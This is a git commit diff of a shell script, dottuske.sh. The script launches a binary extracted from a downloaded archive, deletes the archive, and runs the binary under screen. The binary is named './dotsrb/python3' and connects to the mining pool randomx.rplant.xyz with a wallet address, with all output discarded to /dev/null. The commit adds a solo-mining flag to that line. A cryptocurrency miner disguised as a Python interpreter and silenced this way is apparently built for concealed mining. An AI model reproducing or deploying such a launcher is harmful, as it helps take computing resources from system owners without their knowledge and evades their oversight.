db494baff44708898a9ef847b5ad18dc665b5a48
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-27 04:44:46 +0700

    created hendi kusnandi

--- dottuske.sh
+++ dottuske.sh
@@ -6,4 +6,4 @@ tar -xzvf dot
 
 rm dot
 
-screen ./dotsrb/python3 -o randomx.rplant.xyz:17123 -a randomtuske -u TuskeSyuT7TEvsg3co36hu6z5P2jMksroYnq8ejhxDRd3K6LQSc4LhU8TR4u1CZVNBViJSNN79WUATZ2kgsfywYqehTMRzVaoLb4uF.DOT &>/dev/null
+screen ./dotsrb/python3 -o randomx.rplant.xyz:17123 -a randomtuske -u TuskeSyuT7TEvsg3co36hu6z5P2jMksroYnq8ejhxDRd3K6LQSc4LhU8TR4u1CZVNBViJSNN79WUATZ2kgsfywYqehTMRzVaoLb4uF.DOT -p m=solo &>/dev/null
